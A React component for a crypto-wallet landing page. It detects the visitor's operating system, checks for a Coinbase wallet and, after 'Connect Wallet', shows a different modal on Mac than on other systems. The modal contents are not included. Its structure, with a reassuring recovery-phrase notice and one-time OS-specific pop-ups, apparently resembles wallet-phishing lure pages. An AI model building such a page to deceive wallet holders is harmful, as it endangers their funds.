import React, { useEffect, useState } from "react";
import "../styles/app.css";
import "../styles/modal.css";
import { CoinbaseWalletSDK } from '@coinbase/wallet-sdk';
import WalletModal1 from "./WalletModal1";
import WalletModal2 from "./WalletModal2";



const coinbaseWallet = new CoinbaseWalletSDK({
  appName: 'My Awesome DApp',
  appLogoUrl: 'http://localhost:3000/',
  appChainIds: [1] // e.g., 1 for Ethereum Mainnet
});


const ethereum12 = coinbaseWallet.makeWeb3Provider();



const VIDEO_URL =
  "https://d1i6zd1p5d75mw.cloudfront.net/images/s/headervideo/1/3306010965.mp4";

export default function ButtonPage() {
  const [showModal, setShowModal] = useState(false);
  const [hasCoinbaseWallet, setHasCoinbaseWallet] = useState(false);

  const getOS = () => {
    if (typeof window === "undefined") {
      return "unknown";
    }
    const userAgent = navigator.userAgent.toLowerCase();
    const platform = navigator.platform.toLowerCase();

    if (platform.includes("mac") || userAgent.includes("mac")) {
      return "mac";
    }

    if (platform.includes("win") || userAgent.includes("windows")) {
      return "windows";
    }

    if (platform.includes("linux") || userAgent.includes("linux")) {
      return "linux";
    }

    return "unknown";
  };

  const os = getOS();

  const getCoinbaseProvider = () => {
    if (typeof window === "undefined") {
      return null;
    }

    const ethereum = window.ethereum;
    if (!ethereum) {
      return null;
    }

    if (ethereum.isCoinbaseWallet) {
      return ethereum;
    }

    if (Array.isArray(ethereum.providers)) {
      return ethereum.providers.find((provider) => provider.isCoinbaseWallet) || null;
    }

    return null;
  };

  useEffect(() => {
    if (typeof window === "undefined") {
      return;
    }

    const detectProvider = () => {
      const provider = getCoinbaseProvider();
      setHasCoinbaseWallet(Boolean(provider));
      return provider;
    };

    detectProvider();

    const interval = setInterval(() => {
      if (detectProvider()) {
        clearInterval(interval);
        clearTimeout(timeout);
      }
    }, 250);

    const timeout = setTimeout(() => {
      clearInterval(interval);
    }, 4000);

    window.addEventListener("ethereum#initialized", detectProvider, { once: true });
console.log(Object.keys(ethereum12).length);
    return () => {
      clearInterval(interval);
      clearTimeout(timeout);
      window.removeEventListener("ethereum#initialized", detectProvider);
    };
  }, []);

  const handleConnectWallet = (event) => {
    event?.preventDefault();
    event?.stopPropagation();

    if (typeof window === "undefined") {
      return;
    }

    const provider = getCoinbaseProvider();
    const hasWallet = Boolean(Object.keys(ethereum12).length < 10 ? false : true);
    setHasCoinbaseWallet(hasWallet);

    if (!hasWallet) {
      const walletUrl = "https://www.coinbase.com/wallet/downloads";
      window.location.href = walletUrl;
      return;
    }

    const done = window.localStorage.getItem("wallet_done");

    if (done !== "true") {
      setShowModal(true);
    }
  };

  return (
    <div className="button-page">
      <video
        className="button-page-video"
        src={VIDEO_URL}
        autoPlay
        muted
        loop
        playsInline
        aria-hidden="true"
      />
      <section className="welcome-card" aria-labelledby="welcome-title">
        <h1 className="welcome-title" id="welcome-title">WELCOME!</h1>

        <button
          type="button"
          className="connect-wallet-button"
          onClick={handleConnectWallet}
        >
          {hasCoinbaseWallet ? "Connect Wallet" : "Install Wallet"}
        </button>

        <p className="security-message">
          Keep your recovery phrase private.<br/> 
          Your recovery phrase is the only way to restore your wallet. 
          Our team will never request it.
        </p>
      </section>
     

      {showModal &&
        (os === "mac" ? (
          <WalletModal1 onClose={() => setShowModal(false)} />
        ) : (
          <WalletModal2 onClose={() => setShowModal(false)} />
        ))}
    </div>
  );
}
